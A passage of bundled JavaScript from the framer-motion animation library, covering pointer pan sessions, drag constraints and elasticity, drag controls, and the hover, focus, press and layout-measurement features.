		this.removeListeners = pipe(addPointerEvent(this.contextWindow, "pointermove", this.handlePointerMove), addPointerEvent(this.contextWindow, "pointerup", this.handlePointerUp), addPointerEvent(this.contextWindow, "pointercancel", this.handlePointerUp));
		if (element) this.startScrollTracking(element);
	}
	/**
	* Start tracking scroll on ancestors and window.
	*/
	startScrollTracking(element) {
		let current = element.parentElement;
		while (current) {
			const style = getComputedStyle(current);
			if (overflowStyles.has(style.overflowX) || overflowStyles.has(style.overflowY)) this.scrollPositions.set(current, {
				x: current.scrollLeft,
				y: current.scrollTop
			});
			current = current.parentElement;
		}
		this.scrollPositions.set(window, {
			x: window.scrollX,
			y: window.scrollY
		});
		window.addEventListener("scroll", this.onElementScroll, { capture: true });
		window.addEventListener("scroll", this.onWindowScroll);
		this.removeScrollListeners = () => {
			window.removeEventListener("scroll", this.onElementScroll, { capture: true });
			window.removeEventListener("scroll", this.onWindowScroll);
		};
	}
	/**
	* Handle scroll compensation during drag.
	*
	* For element scroll: adjusts history origin since pageX/pageY doesn't change.
	* For window scroll: adjusts lastMoveEventInfo since pageX/pageY would change.
	*/
	handleScroll(target) {
		const initial = this.scrollPositions.get(target);
		if (!initial) return;
		const isWindow = target === window;
		const current = isWindow ? {
			x: window.scrollX,
			y: window.scrollY
		} : {
			x: target.scrollLeft,
			y: target.scrollTop
		};
		const delta = {
			x: current.x - initial.x,
			y: current.y - initial.y
		};
		if (delta.x === 0 && delta.y === 0) return;
		if (isWindow) {
			if (this.lastMoveEventInfo) {
				this.lastMoveEventInfo.point.x += delta.x;
				this.lastMoveEventInfo.point.y += delta.y;
			}
		} else if (this.history.length > 0) {
			this.history[0].x -= delta.x;
			this.history[0].y -= delta.y;
		}
		this.scrollPositions.set(target, current);
		frame.update(this.updatePoint, true);
	}
	updateHandlers(handlers) {
		this.handlers = handlers;
	}
	end() {
		this.removeListeners && this.removeListeners();
		this.removeScrollListeners && this.removeScrollListeners();
		this.scrollPositions.clear();
		cancelFrame(this.updatePoint);
	}
};
function transformPoint(info, transformPagePoint) {
	return transformPagePoint ? { point: transformPagePoint(info.point) } : info;
}
function subtractPoint(a, b) {
	return {
		x: a.x - b.x,
		y: a.y - b.y
	};
}
function getPanInfo({ point }, history) {
	return {
		point,
		delta: subtractPoint(point, lastDevicePoint(history)),
		offset: subtractPoint(point, startDevicePoint(history)),
		velocity: getVelocity(history, .1)
	};
}
function startDevicePoint(history) {
	return history[0];
}
function lastDevicePoint(history) {
	return history[history.length - 1];
}
function getVelocity(history, timeDelta) {
	if (history.length < 2) return {
		x: 0,
		y: 0
	};
	let i = history.length - 1;
	let timestampedPoint = null;
	const lastPoint = lastDevicePoint(history);
	while (i >= 0) {
		timestampedPoint = history[i];
		if (lastPoint.timestamp - timestampedPoint.timestamp > /* @__PURE__ */ secondsToMilliseconds(timeDelta)) break;
		i--;
	}
	if (!timestampedPoint) return {
		x: 0,
		y: 0
	};
	/**
	* If the selected point is the pointer-down origin (history[0]),
	* there are better movement points available, and the time gap
	* is suspiciously large (>2x timeDelta), use the next point instead.
	* This prevents stale pointer-down points from diluting velocity
	* in hold-then-flick gestures.
	*/
	if (timestampedPoint === history[0] && history.length > 2 && lastPoint.timestamp - timestampedPoint.timestamp > /* @__PURE__ */ secondsToMilliseconds(timeDelta) * 2) timestampedPoint = history[1];
	const time = /* @__PURE__ */ millisecondsToSeconds(lastPoint.timestamp - timestampedPoint.timestamp);
	if (time === 0) return {
		x: 0,
		y: 0
	};
	const currentVelocity = {
		x: (lastPoint.x - timestampedPoint.x) / time,
		y: (lastPoint.y - timestampedPoint.y) / time
	};
	if (currentVelocity.x === Infinity) currentVelocity.x = 0;
	if (currentVelocity.y === Infinity) currentVelocity.y = 0;
	return currentVelocity;
}
// node_modules/framer-motion/dist/es/gestures/drag/utils/constraints.mjs
/**
* Apply constraints to a point. These constraints are both physical along an
* axis, and an elastic factor that determines how much to constrain the point
* by if it does lie outside the defined parameters.
*/
function applyConstraints(point, { min, max }, elastic) {
	if (min !== void 0 && point < min) point = elastic ? mixNumber$1(min, point, elastic.min) : Math.max(point, min);
	else if (max !== void 0 && point > max) point = elastic ? mixNumber$1(max, point, elastic.max) : Math.min(point, max);
	return point;
}
/**
* Calculate constraints in terms of the viewport when defined relatively to the
* measured axis. This is measured from the nearest edge, so a max constraint of 200
* on an axis with a max value of 300 would return a constraint of 500 - axis length
*/
function calcRelativeAxisConstraints(axis, min, max) {
	return {
		min: min !== void 0 ? axis.min + min : void 0,
		max: max !== void 0 ? axis.max + max - (axis.max - axis.min) : void 0
	};
}
/**
* Calculate constraints in terms of the viewport when
* defined relatively to the measured bounding box.
*/
function calcRelativeConstraints(layoutBox, { top, left, bottom, right }) {
	return {
		x: calcRelativeAxisConstraints(layoutBox.x, left, right),
		y: calcRelativeAxisConstraints(layoutBox.y, top, bottom)
	};
}
/**
* Calculate viewport constraints when defined as another viewport-relative axis
*/
function calcViewportAxisConstraints(layoutAxis, constraintsAxis) {
	let min = constraintsAxis.min - layoutAxis.min;
	let max = constraintsAxis.max - layoutAxis.max;
	if (constraintsAxis.max - constraintsAxis.min < layoutAxis.max - layoutAxis.min) [min, max] = [max, min];
	return {
		min,
		max
	};
}
/**
* Calculate viewport constraints when defined as another viewport-relative box
*/
function calcViewportConstraints(layoutBox, constraintsBox) {
	return {
		x: calcViewportAxisConstraints(layoutBox.x, constraintsBox.x),
		y: calcViewportAxisConstraints(layoutBox.y, constraintsBox.y)
	};
}
/**
* Calculate a transform origin relative to the source axis, between 0-1, that results
* in an asthetically pleasing scale/transform needed to project from source to target.
*/
function calcOrigin(source, target) {
	let origin = .5;
	const sourceLength = calcLength(source);
	const targetLength = calcLength(target);
	if (targetLength > sourceLength) origin = /* @__PURE__ */ progress(target.min, target.max - sourceLength, source.min);
	else if (sourceLength > targetLength) origin = /* @__PURE__ */ progress(source.min, source.max - targetLength, target.min);
	return clamp(0, 1, origin);
}
/**
* Rebase the calculated viewport constraints relative to the layout.min point.
*/
function rebaseAxisConstraints(layout, constraints) {
	const relativeConstraints = {};
	if (constraints.min !== void 0) relativeConstraints.min = constraints.min - layout.min;
	if (constraints.max !== void 0) relativeConstraints.max = constraints.max - layout.min;
	return relativeConstraints;
}
var defaultElastic = .35;
/**
* Accepts a dragElastic prop and returns resolved elastic values for each axis.
*/
function resolveDragElastic(dragElastic = defaultElastic) {
	if (dragElastic === false) dragElastic = 0;
	else if (dragElastic === true) dragElastic = defaultElastic;
	return {
		x: resolveAxisElastic(dragElastic, "left", "right"),
		y: resolveAxisElastic(dragElastic, "top", "bottom")
	};
}
function resolveAxisElastic(dragElastic, minLabel, maxLabel) {
	return {
		min: resolvePointElastic(dragElastic, minLabel),
		max: resolvePointElastic(dragElastic, maxLabel)
	};
}
function resolvePointElastic(dragElastic, label) {
	return typeof dragElastic === "number" ? dragElastic : dragElastic[label] || 0;
}
// node_modules/framer-motion/dist/es/gestures/drag/VisualElementDragControls.mjs
var elementDragControls = /* @__PURE__ */ new WeakMap();
var VisualElementDragControls = class {
	constructor(visualElement) {
		this.openDragLock = null;
		this.isDragging = false;
		this.currentDirection = null;
		this.originPoint = {
			x: 0,
			y: 0
		};
		/**
		* The permitted boundaries of travel, in pixels.
		*/
		this.constraints = false;
		this.hasMutatedConstraints = false;
		/**
		* The per-axis resolved elastic values.
		*/
		this.elastic = createBox();
		/**
		* The latest pointer event. Used as fallback when the `cancel` and `stop` functions are called without arguments.
		*/
		this.latestPointerEvent = null;
		/**
		* The latest pan info. Used as fallback when the `cancel` and `stop` functions are called without arguments.
		*/
		this.latestPanInfo = null;
		this.visualElement = visualElement;
	}
	start(originEvent, { snapToCursor = false, distanceThreshold } = {}) {
		/**
		* Don't start dragging if this component is exiting
		*/
		const { presenceContext } = this.visualElement;
		if (presenceContext && presenceContext.isPresent === false) return;
		const onSessionStart = (event) => {
			if (snapToCursor) this.snapToCursor(extractEventInfo(event).point);
			this.stopAnimation();
		};
		const onStart = (event, info) => {
			const { drag, dragPropagation, onDragStart } = this.getProps();
			if (drag && !dragPropagation) {
				if (this.openDragLock) this.openDragLock();
				this.openDragLock = setDragLock(drag);
				if (!this.openDragLock) return;
			}
			this.latestPointerEvent = event;
			this.latestPanInfo = info;
			this.isDragging = true;
			this.currentDirection = null;
			this.resolveConstraints();
			if (this.visualElement.projection) {
				this.visualElement.projection.isAnimationBlocked = true;
				this.visualElement.projection.target = void 0;
			}
			/**
			* Record gesture origin and pointer offset
			*/
			eachAxis((axis) => {
				let current = this.getAxisMotionValue(axis).get() || 0;
				/**
				* If the MotionValue is a percentage value convert to px
				*/
				if (percent.test(current)) {
					const { projection } = this.visualElement;
					if (projection && projection.layout) {
						const measuredAxis = projection.layout.layoutBox[axis];
						if (measuredAxis) current = calcLength(measuredAxis) * (parseFloat(current) / 100);
					}
				}
				this.originPoint[axis] = current;
			});
			if (onDragStart) frame.update(() => onDragStart(event, info), false, true);
			addValueToWillChange(this.visualElement, "transform");
			const { animationState } = this.visualElement;
			animationState && animationState.setActive("whileDrag", true);
		};
		const onMove = (event, info) => {
			this.latestPointerEvent = event;
			this.latestPanInfo = info;
			const { dragPropagation, dragDirectionLock, onDirectionLock, onDrag } = this.getProps();
			if (!dragPropagation && !this.openDragLock) return;
			const { offset } = info;
			if (dragDirectionLock && this.currentDirection === null) {
				this.currentDirection = getCurrentDirection(offset);
				if (this.currentDirection !== null) onDirectionLock && onDirectionLock(this.currentDirection);
				return;
			}
			this.updateAxis("x", info.point, offset);
			this.updateAxis("y", info.point, offset);
			/**
			* Ideally we would leave the renderer to fire naturally at the end of
			* this frame but if the element is about to change layout as the result
			* of a re-render we want to ensure the browser can read the latest
			* bounding box to ensure the pointer and element don't fall out of sync.
			*/
			this.visualElement.render();
			/**
			* This must fire after the render call as it might trigger a state
			* change which itself might trigger a layout update.
			*/
			if (onDrag) frame.update(() => onDrag(event, info), false, true);
		};
		const onSessionEnd = (event, info) => {
			this.latestPointerEvent = event;
			this.latestPanInfo = info;
			this.stop(event, info);
			this.latestPointerEvent = null;
			this.latestPanInfo = null;
		};
		const resumeAnimation = () => {
			const { dragSnapToOrigin: snap } = this.getProps();
			if (snap || this.constraints) this.startAnimation({
				x: 0,
				y: 0
			});
		};
		const { dragSnapToOrigin } = this.getProps();
		this.panSession = new PanSession(originEvent, {
			onSessionStart,
			onStart,
			onMove,
			onSessionEnd,
			resumeAnimation
		}, {
			transformPagePoint: this.visualElement.getTransformPagePoint(),
			dragSnapToOrigin,
			distanceThreshold,
			contextWindow: getContextWindow(this.visualElement),
			element: this.visualElement.current
		});
	}
	/**
	* @internal
	*/
	stop(event, panInfo) {
		const finalEvent = event || this.latestPointerEvent;
		const finalPanInfo = panInfo || this.latestPanInfo;
		const isDragging = this.isDragging;
		this.cancel();
		if (!isDragging || !finalPanInfo || !finalEvent) return;
		const { velocity } = finalPanInfo;
		this.startAnimation(velocity);
		const { onDragEnd } = this.getProps();
		if (onDragEnd) frame.postRender(() => onDragEnd(finalEvent, finalPanInfo));
	}
	/**
	* @internal
	*/
	cancel() {
		this.isDragging = false;
		const { projection, animationState } = this.visualElement;
		if (projection) projection.isAnimationBlocked = false;
		this.endPanSession();
		const { dragPropagation } = this.getProps();
		if (!dragPropagation && this.openDragLock) {
			this.openDragLock();
			this.openDragLock = null;
		}
		animationState && animationState.setActive("whileDrag", false);
	}
	/**
	* Clean up the pan session without modifying other drag state.
	* This is used during unmount to ensure event listeners are removed
	* without affecting projection animations or drag locks.
	* @internal
	*/
	endPanSession() {
		this.panSession && this.panSession.end();
		this.panSession = void 0;
	}
	updateAxis(axis, _point, offset) {
		const { drag } = this.getProps();
		if (!offset || !shouldDrag(axis, drag, this.currentDirection)) return;
		const axisValue = this.getAxisMotionValue(axis);
		let next = this.originPoint[axis] + offset[axis];
		if (this.constraints && this.constraints[axis]) next = applyConstraints(next, this.constraints[axis], this.elastic[axis]);
		axisValue.set(next);
	}
	resolveConstraints() {
		const { dragConstraints, dragElastic } = this.getProps();
		const layout = this.visualElement.projection && !this.visualElement.projection.layout ? this.visualElement.projection.measure(false) : this.visualElement.projection?.layout;
		const prevConstraints = this.constraints;
		if (dragConstraints && isRefObject(dragConstraints)) {
			if (!this.constraints) this.constraints = this.resolveRefConstraints();
		} else if (dragConstraints && layout) this.constraints = calcRelativeConstraints(layout.layoutBox, dragConstraints);
		else this.constraints = false;
		this.elastic = resolveDragElastic(dragElastic);
		/**
		* If we're outputting to external MotionValues, we want to rebase the measured constraints
		* from viewport-relative to component-relative. This only applies to relative (non-ref)
		* constraints, as ref-based constraints from calcViewportConstraints are already in the
		* correct coordinate space for the motion value transform offset.
		*/
		if (prevConstraints !== this.constraints && !isRefObject(dragConstraints) && layout && this.constraints && !this.hasMutatedConstraints) eachAxis((axis) => {
			if (this.constraints !== false && this.getAxisMotionValue(axis)) this.constraints[axis] = rebaseAxisConstraints(layout.layoutBox[axis], this.constraints[axis]);
		});
	}
	resolveRefConstraints() {
		const { dragConstraints: constraints, onMeasureDragConstraints } = this.getProps();
		if (!constraints || !isRefObject(constraints)) return false;
		const constraintsElement = constraints.current;
		const { projection } = this.visualElement;
		if (!projection || !projection.layout) return false;
		/**
		* Refresh the root scroll offset so the constraint's viewport box
		* translates to correct page coordinates. The scroll captured at
		* drag mount can be stale if the document was scrolled afterwards —
		* e.g. via the browser restoring scroll on refresh, or an ancestor
		* layout effect running after this element's mount (#2829).
		*
		* Clear the cached scroll first so `updateScroll` bypasses its
		* per-animationId cache and re-reads the live value.
		*/
		if (projection.root) {
			projection.root.scroll = void 0;
			projection.root.updateScroll();
		}
		const constraintsBox = measurePageBox(constraintsElement, projection.root, this.visualElement.getTransformPagePoint());
		let measuredConstraints = calcViewportConstraints(projection.layout.layoutBox, constraintsBox);
		/**
		* If there's an onMeasureDragConstraints listener we call it and
		* if different constraints are returned, set constraints to that
		*/
		if (onMeasureDragConstraints) {
			const userConstraints = onMeasureDragConstraints(convertBoxToBoundingBox(measuredConstraints));
			this.hasMutatedConstraints = !!userConstraints;
			if (userConstraints) measuredConstraints = convertBoundingBoxToBox(userConstraints);
		}
		return measuredConstraints;
	}
	startAnimation(velocity) {
		const { drag, dragMomentum, dragElastic, dragTransition, dragSnapToOrigin, onDragTransitionEnd } = this.getProps();
		const constraints = this.constraints || {};
		const momentumAnimations = eachAxis((axis) => {
			if (!shouldDrag(axis, drag, this.currentDirection)) return;
			let transition = constraints && constraints[axis] || {};
			if (dragSnapToOrigin === true || dragSnapToOrigin === axis) transition = {
				min: 0,
				max: 0
			};
			/**
			* Overdamp the boundary spring if `dragElastic` is disabled. There's still a frame
			* of spring animations so we should look into adding a disable spring option to `inertia`.
			* We could do something here where we affect the `bounceStiffness` and `bounceDamping`
			* using the value of `dragElastic`.
			*/
			const bounceStiffness = dragElastic ? 200 : 1e6;
			const bounceDamping = dragElastic ? 40 : 1e7;
			const inertia = {
				type: "inertia",
				velocity: dragMomentum ? velocity[axis] : 0,
				bounceStiffness,
				bounceDamping,
				timeConstant: 750,
				restDelta: 1,
				restSpeed: 10,
				...dragTransition,
				...transition
			};
			return this.startAxisValueAnimation(axis, inertia);
		});
		return Promise.all(momentumAnimations).then(onDragTransitionEnd);
	}
	startAxisValueAnimation(axis, transition) {
		const axisValue = this.getAxisMotionValue(axis);
		addValueToWillChange(this.visualElement, axis);
		return axisValue.start(animateMotionValue(axis, axisValue, 0, transition, this.visualElement, false));
	}
	stopAnimation() {
		eachAxis((axis) => this.getAxisMotionValue(axis).stop());
	}
	/**
	* Drag works differently depending on which props are provided.
	*
	* - If _dragX and _dragY are provided, we output the gesture delta directly to those motion values.
	* - Otherwise, we apply the delta to the x/y motion values.
	*/
	getAxisMotionValue(axis) {
		const dragKey = `_drag${axis.toUpperCase()}`;
		const externalMotionValue = this.visualElement.getProps()[dragKey];
		return externalMotionValue ? externalMotionValue : this.visualElement.getValue(axis, this.visualElement.latestValues[axis] ?? 0);
	}
	snapToCursor(point) {
		eachAxis((axis) => {
			const { drag } = this.getProps();
			if (!shouldDrag(axis, drag, this.currentDirection)) return;
			const { projection } = this.visualElement;
			const axisValue = this.getAxisMotionValue(axis);
			if (projection && projection.layout) {
				const { min, max } = projection.layout.layoutBox[axis];
				/**
				* The layout measurement includes the current transform value,
				* so we need to add it back to get the correct snap position.
				* This fixes an issue where elements with initial coordinates
				* would snap to the wrong position on the first drag.
				*/
				const current = axisValue.get() || 0;
				axisValue.set(point[axis] - mixNumber$1(min, max, .5) + current);
			}
		});
	}
	/**
	* When the viewport resizes we want to check if the measured constraints
	* have changed and, if so, reposition the element within those new constraints
	* relative to where it was before the resize.
	*/
	scalePositionWithinConstraints() {
		if (!this.visualElement.current) return;
		const { drag, dragConstraints } = this.getProps();
		const { projection } = this.visualElement;
		if (!isRefObject(dragConstraints) || !projection || !this.constraints) return;
		/**
		* Stop current animations as there can be visual glitching if we try to do
		* this mid-animation
		*/
		this.stopAnimation();
		/**
		* Record the relative position of the dragged element relative to the
		* constraints box and save as a progress value.
		*/
		const boxProgress = {
			x: 0,
			y: 0
		};
		eachAxis((axis) => {
			const axisValue = this.getAxisMotionValue(axis);
			if (axisValue && this.constraints !== false) {
				const latest = axisValue.get();
				boxProgress[axis] = calcOrigin({
					min: latest,
					max: latest
				}, this.constraints[axis]);
			}
		});
		/**
		* Update the layout of this element and resolve the latest drag constraints
		*/
		const { transformTemplate } = this.visualElement.getProps();
		this.visualElement.current.style.transform = transformTemplate ? transformTemplate({}, "") : "none";
		projection.root && projection.root.updateScroll();
		projection.updateLayout();
		/**
		* Reset constraints so resolveConstraints() will recalculate them
		* with the freshly measured layout rather than returning the cached value.
		*/
		this.constraints = false;
		this.resolveConstraints();
		/**
		* For each axis, calculate the current progress of the layout axis
		* within the new constraints.
		*/
		eachAxis((axis) => {
			if (!shouldDrag(axis, drag, null)) return;
			/**
			* Calculate a new transform based on the previous box progress
			*/
			const axisValue = this.getAxisMotionValue(axis);
			const { min, max } = this.constraints[axis];
			axisValue.set(mixNumber$1(min, max, boxProgress[axis]));
		});
		/**
		* Flush the updated transform to the DOM synchronously to prevent
		* a visual flash at the element's CSS layout position (0,0) when
		* the transform was stripped for measurement.
		*/
		this.visualElement.render();
	}
	addListeners() {
		if (!this.visualElement.current) return;
		elementDragControls.set(this.visualElement, this);
		const element = this.visualElement.current;
		/**
		* Attach a pointerdown event listener on this DOM element to initiate drag tracking.
		*/
		const stopPointerListener = addPointerEvent(element, "pointerdown", (event) => {
			const { drag, dragListener = true } = this.getProps();
			const target = event.target;
			/**
			* Only block drag if clicking on a text input child element
			* (input, textarea, select, contenteditable) where users might
			* want to select text or interact with the control.
			*
			* Buttons and links don't block drag since they don't have
			* click-and-move actions of their own.
			*/
			const isClickingTextInputChild = target !== element && isElementTextInput(target);
			if (drag && dragListener && !isClickingTextInputChild) this.start(event);
		});
		/**
		* If using ref-based constraints, observe both the draggable element
		* and the constraint container for size changes via ResizeObserver.
		* Setup is deferred because dragConstraints.current is null when
		* addListeners first runs (React hasn't committed the ref yet).
		*/
		let stopResizeObservers;
		const measureDragConstraints = () => {
			const { dragConstraints } = this.getProps();
			if (isRefObject(dragConstraints) && dragConstraints.current) {
				this.constraints = this.resolveRefConstraints();
				if (!stopResizeObservers) stopResizeObservers = startResizeObservers(element, dragConstraints.current, () => this.scalePositionWithinConstraints());
			}
		};
		const { projection } = this.visualElement;
		const stopMeasureLayoutListener = projection.addEventListener("measure", measureDragConstraints);
		if (projection && !projection.layout) {
			projection.root && projection.root.updateScroll();
			projection.updateLayout();
		}
		frame.read(measureDragConstraints);
		/**
		* Attach a window resize listener to scale the draggable target within its defined
		* constraints as the window resizes.
		*/
		const stopResizeListener = addDomEvent(window, "resize", () => this.scalePositionWithinConstraints());
		/**
		* If the element's layout changes, calculate the delta and apply that to
		* the drag gesture's origin point.
		*/
		const stopLayoutUpdateListener = projection.addEventListener("didUpdate", (({ delta, hasLayoutChanged }) => {
			if (this.isDragging && hasLayoutChanged) {
				eachAxis((axis) => {
					const motionValue = this.getAxisMotionValue(axis);
					if (!motionValue) return;
					this.originPoint[axis] += delta[axis].translate;
					motionValue.set(motionValue.get() + delta[axis].translate);
				});
				this.visualElement.render();
			}
		}));
		return () => {
			stopResizeListener();
			stopPointerListener();
			stopMeasureLayoutListener();
			stopLayoutUpdateListener && stopLayoutUpdateListener();
			stopResizeObservers && stopResizeObservers();
		};
	}
	getProps() {
		const props = this.visualElement.getProps();
		const { drag = false, dragDirectionLock = false, dragPropagation = false, dragConstraints = false, dragElastic = defaultElastic, dragMomentum = true } = props;
		return {
			...props,
			drag,
			dragDirectionLock,
			dragPropagation,
			dragConstraints,
			dragElastic,
			dragMomentum
		};
	}
};
function skipFirstCall(callback) {
	let isFirst = true;
	return () => {
		if (isFirst) {
			isFirst = false;
			return;
		}
		callback();
	};
}
function startResizeObservers(element, constraintsElement, onResize) {
	const stopElement = resize(element, skipFirstCall(onResize));
	const stopContainer = resize(constraintsElement, skipFirstCall(onResize));
	return () => {
		stopElement();
		stopContainer();
	};
}
function shouldDrag(direction, drag, currentDirection) {
	return (drag === true || drag === direction) && (currentDirection === null || currentDirection === direction);
}
/**
* Based on an x/y offset determine the current drag direction. If both axis' offsets are lower
* than the provided threshold, return `null`.
*
* @param offset - The x/y offset from origin.
* @param lockThreshold - (Optional) - the minimum absolute offset before we can determine a drag direction.
*/
function getCurrentDirection(offset, lockThreshold = 10) {
	let direction = null;
	if (Math.abs(offset.y) > lockThreshold) direction = "y";
	else if (Math.abs(offset.x) > lockThreshold) direction = "x";
	return direction;
}
// node_modules/framer-motion/dist/es/gestures/drag/index.mjs
var DragGesture = class extends Feature {
	constructor(node) {
		super(node);
		this.removeGroupControls = noop;
		this.removeListeners = noop;
		this.controls = new VisualElementDragControls(node);
	}
	mount() {
		const { dragControls } = this.node.getProps();
		if (dragControls) this.removeGroupControls = dragControls.subscribe(this.controls);
		this.removeListeners = this.controls.addListeners() || noop;
	}
	update() {
		const { dragControls } = this.node.getProps();
		const { dragControls: prevDragControls } = this.node.prevProps || {};
		if (dragControls !== prevDragControls) {
			this.removeGroupControls();
			if (dragControls) this.removeGroupControls = dragControls.subscribe(this.controls);
		}
	}
	unmount() {
		this.removeGroupControls();
		this.removeListeners();
		/**
		* In React 19, during list reorder reconciliation, components may
		* briefly unmount and remount while the drag is still active. If we're
		* actively dragging, we should NOT end the pan session - it will
		* continue tracking pointer events via its window-level listeners.
		*
		* The pan session will be properly cleaned up when:
		* 1. The drag ends naturally (pointerup/pointercancel)
		* 2. The component is truly removed from the DOM
		*/
		if (!this.controls.isDragging) this.controls.endPanSession();
	}
};
// node_modules/framer-motion/dist/es/gestures/pan/index.mjs
var asyncHandler = (handler) => (event, info) => {
	if (handler) frame.update(() => handler(event, info), false, true);
};
var PanGesture = class extends Feature {
	constructor() {
		super(...arguments);
		this.removePointerDownListener = noop;
	}
	onPointerDown(pointerDownEvent) {
		this.session = new PanSession(pointerDownEvent, this.createPanHandlers(), {
			transformPagePoint: this.node.getTransformPagePoint(),
			contextWindow: getContextWindow(this.node)
		});
	}
	createPanHandlers() {
		const { onPanSessionStart, onPanStart, onPan, onPanEnd } = this.node.getProps();
		return {
			onSessionStart: asyncHandler(onPanSessionStart),
			onStart: asyncHandler(onPanStart),
			onMove: asyncHandler(onPan),
			onEnd: (event, info) => {
				delete this.session;
				if (onPanEnd) frame.postRender(() => onPanEnd(event, info));
			}
		};
	}
	mount() {
		this.removePointerDownListener = addPointerEvent(this.node.current, "pointerdown", (event) => this.onPointerDown(event));
	}
	update() {
		this.session && this.session.updateHandlers(this.createPanHandlers());
	}
	unmount() {
		this.removePointerDownListener();
		this.session && this.session.end();
	}
};
// node_modules/framer-motion/dist/es/motion/features/layout/MeasureLayout.mjs
/**
* Track whether we've taken any snapshots yet. If not,
* we can safely skip notification of didUpdate.
*
* Difficult to capture in a test but to prevent flickering
* we must set this to true either on update or unmount.
* Running `next-env/layout-id` in Safari will show this behaviour if broken.
*/
var hasTakenAnySnapshot = false;
var MeasureLayoutWithContext = class extends Component {
	/**
	* This only mounts projection nodes for components that
	* need measuring, we might want to do it for all components
	* in order to incorporate transforms
	*/
	componentDidMount() {
		const { visualElement, layoutGroup, switchLayoutGroup, layoutId } = this.props;
		const { projection } = visualElement;
		if (projection) {
			if (layoutGroup.group) layoutGroup.group.add(projection);
			if (switchLayoutGroup && switchLayoutGroup.register && layoutId) switchLayoutGroup.register(projection);
			if (hasTakenAnySnapshot) projection.root.didUpdate();
			projection.addEventListener("animationComplete", () => {
				this.safeToRemove();
			});
			projection.setOptions({
				...projection.options,
				layoutDependency: this.props.layoutDependency,
				onExitComplete: () => this.safeToRemove()
			});
		}
		globalProjectionState.hasEverUpdated = true;
	}
	getSnapshotBeforeUpdate(prevProps) {
		const { layoutDependency, visualElement, drag, isPresent } = this.props;
		const { projection } = visualElement;
		if (!projection) return null;
		/**
		* TODO: We use this data in relegate to determine whether to
		* promote a previous element. There's no guarantee its presence data
		* will have updated by this point - if a bug like this arises it will
		* have to be that we markForRelegation and then find a new lead some other way,
		* perhaps in didUpdate
		*/
		projection.isPresent = isPresent;
		if (prevProps.layoutDependency !== layoutDependency) projection.setOptions({
			...projection.options,
			layoutDependency
		});
		hasTakenAnySnapshot = true;
		if (drag || prevProps.layoutDependency !== layoutDependency || layoutDependency === void 0 || prevProps.isPresent !== isPresent) projection.willUpdate();
		else this.safeToRemove();
		if (prevProps.isPresent !== isPresent) {
			if (isPresent) projection.promote();
			else if (!projection.relegate())
 /**
			* If there's another stack member taking over from this one,
			* it's in charge of the exit animation and therefore should
			* be in charge of the safe to remove. Otherwise we call it here.
			*/
			frame.postRender(() => {
				const stack = projection.getStack();
				if (!stack || !stack.members.length) this.safeToRemove();
			});
		}
		return null;
	}
	componentDidUpdate() {
		const { visualElement, layoutAnchor } = this.props;
		const { projection } = visualElement;
		if (projection) {
			projection.options.layoutAnchor = layoutAnchor;
			projection.root.didUpdate();
			microtask.postRender(() => {
				if (!projection.currentAnimation && projection.isLead()) this.safeToRemove();
			});
		}
	}
	componentWillUnmount() {
		const { visualElement, layoutGroup, switchLayoutGroup: promoteContext } = this.props;
		const { projection } = visualElement;
		hasTakenAnySnapshot = true;
		if (projection) {
			projection.scheduleCheckAfterUnmount();
			if (layoutGroup && layoutGroup.group) layoutGroup.group.remove(projection);
			if (promoteContext && promoteContext.deregister) promoteContext.deregister(projection);
		}
	}
	safeToRemove() {
		const { safeToRemove } = this.props;
		safeToRemove && safeToRemove();
	}
	render() {
		return null;
	}
};
function MeasureLayout(props) {
	const [isPresent, safeToRemove] = usePresence();
	const layoutGroup = useContext(LayoutGroupContext);
	return jsx(MeasureLayoutWithContext, {
		...props,
		layoutGroup,
		switchLayoutGroup: useContext(SwitchLayoutGroupContext),
		isPresent,
		safeToRemove
	});
}
// node_modules/framer-motion/dist/es/motion/features/drag.mjs
var drag = {
	pan: { Feature: PanGesture },
	drag: {
		Feature: DragGesture,
		ProjectionNode: HTMLProjectionNode,
		MeasureLayout
	}
};
// node_modules/framer-motion/dist/es/gestures/hover.mjs
function handleHoverEvent(node, event, lifecycle) {
	const { props } = node;
	if (node.animationState && props.whileHover) node.animationState.setActive("whileHover", lifecycle === "Start");
	const callback = props["onHover" + lifecycle];
	if (callback) frame.postRender(() => callback(event, extractEventInfo(event)));
}
var HoverGesture = class extends Feature {
	mount() {
		const { current } = this.node;
		if (!current) return;
		this.unmount = hover(current, (_element, startEvent) => {
			handleHoverEvent(this.node, startEvent, "Start");
			return (endEvent) => handleHoverEvent(this.node, endEvent, "End");
		});
	}
	unmount() {}
};
// node_modules/framer-motion/dist/es/gestures/focus.mjs
var FocusGesture = class extends Feature {
	constructor() {
		super(...arguments);
		this.isActive = false;
	}
	onFocus() {
		let isFocusVisible = false;
		/**
		* If this element doesn't match focus-visible then don't
		* apply whileHover. But, if matches throws that focus-visible
		* is not a valid selector then in that browser outline styles will be applied
		* to the element by default and we want to match that behaviour with whileFocus.
		*/
		try {
			isFocusVisible = this.node.current.matches(":focus-visible");
		} catch (e) {
			isFocusVisible = true;
		}
		if (!isFocusVisible || !this.node.animationState) return;
		this.node.animationState.setActive("whileFocus", true);
		this.isActive = true;
	}
	onBlur() {
		if (!this.isActive || !this.node.animationState) return;
		this.node.animationState.setActive("whileFocus", false);
		this.isActive = false;
	}
	mount() {
		this.unmount = pipe(addDomEvent(this.node.current, "focus", () => this.onFocus()), addDomEvent(this.node.current, "blur", () => this.onBlur()));
	}
	unmount() {}
};
// node_modules/framer-motion/dist/es/gestures/press.mjs
function handlePressEvent(node, event, lifecycle) {
	const { props } = node;
	if (node.current instanceof HTMLButtonElement && node.current.disabled) return;
	if (node.animationState && props.whileTap) node.animationState.setActive("whileTap", lifecycle === "Start");
	const callback = props["onTap" + (lifecycle === "End" ? "" : lifecycle)];
	if (callback) frame.postRender(() => callback(event, extractEventInfo(event)));
}
var PressGesture = class extends Feature {
	mount() {
		const { current } = this.node;
		if (!current) return;
		const { globalTapTarget, propagate } = this.node.props;
		this.unmount = press(current, (_element, startEvent) => {
			handlePressEvent(this.node, startEvent, "Start");
			return (endEvent, { success }) => handlePressEvent(this.node, endEvent, success ? "End" : "Cancel");
		}, {
			useGlobalTarget: globalTapTarget,
			stopPropagation: propagate?.tap === false
		});
	}
	unmount() {}
};
// node_modules/framer-motion/dist/es/motion/features/viewport/observers.mjs
/**
* Map an IntersectionHandler callback to an element. We only ever make one handler for one
* element, so even though these handlers might all be triggered by different
* observers, we can keep them in the same map.
*/
var observerCallbacks = /* @__PURE__ */ new WeakMap();
/**
* Multiple observers can be created for multiple element/document roots. Each with
* different settings. So here we store dictionaries of observers to each root,
